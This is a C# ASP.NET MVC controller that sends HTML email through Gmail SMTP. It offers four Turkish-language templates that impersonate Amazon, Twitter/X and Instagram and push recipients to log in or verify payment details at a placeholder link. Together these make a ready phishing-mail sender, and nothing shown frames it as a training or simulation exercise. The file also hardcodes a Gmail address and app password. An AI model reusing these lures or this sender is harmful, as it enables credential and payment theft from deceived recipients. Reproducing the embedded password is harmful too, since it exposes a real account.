using System;
using System.Net.Mail;
using System.Net;
using System.Web;
using System.Web.Mvc;
using System.Collections.Generic;
using System.Web.UI.WebControls;
using WebApplicationMVC2.Models;
using System.Web.UI;

namespace WebApplicationMVC2.Controllers
{
    public class HomeController : Controller
    {
        public ActionResult Dashboard()
        {
            return View();
        }

        public ActionResult SendMail()
        {
            DropDownViewModel model = new DropDownViewModel
            {
                templates = GetDropdownItems(),
            };

            return View(model);
        }

        List<SelectListItem> GetDropdownItems()
        {
            var templates = new List<SelectListItem>
                {
                    new SelectListItem { Value = "Amazon sipariş bilgileriniz teyit edilemedi. Lütfen giriş yapıp bilgilerinizi güncelleyin: LİNK", Text = "Amazon Login" },
                    new SelectListItem { Value = "Amazon Prime ayrıcalığı şu anda sadece 1,00 TL! Bu sınırlı süreli kampanyayı kaçırmamak" +
                    " için linkten ödeme bilgilerinizi doğrulayın: LİNK", Text = "Amazon Payment" },
                    new SelectListItem { Value = "Bir kullanıcı sizi X'te dürttü! Cevap vermek için: LİNK", Text = "Twitter Login" },
                    new SelectListItem { Value = "Dikkat! birisi size ait olan instagram hesabına erişmeye çalışıyor olabilir." +
                    " lütfen güvenliğiniz için giriş yapın ve şifrenizi güncelleyin.: LİNK ", Text = "Instagram Login" }
                };
            return templates;
        }

        [HttpPost]
        public ActionResult SendMail(string to, string subject, string message, HttpPostedFileBase attachment)
        {
            try
            {
                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress("uguroguzhan1398@gmail.com");
                    mail.To.Add(to);
                    mail.Subject = subject;
                    mail.Body = message;
                    mail.IsBodyHtml = true;

                    if (attachment != null && attachment.ContentLength > 0)
                    {
                        string fileName = System.IO.Path.GetFileName(attachment.FileName);
                        mail.Attachments.Add(new Attachment(attachment.InputStream, fileName));
                    }

                    using (SmtpClient smtp = new SmtpClient())
                    {
                        smtp.Host = "smtp.gmail.com";
                        smtp.Port = 587;
                        smtp.Credentials = new NetworkCredential("uguroguzhan1398@gmail.com", "uavu lfvx hchx ijdk");
                        smtp.EnableSsl = true;
                        smtp.Send(mail);
                    }
                }

                ViewBag.Message = "Successfully sent mail!";
            }
            catch (Exception ex)
            {
                ViewBag.Error = $"Error: {ex.Message}";
            }

            return View();
        }
    }
}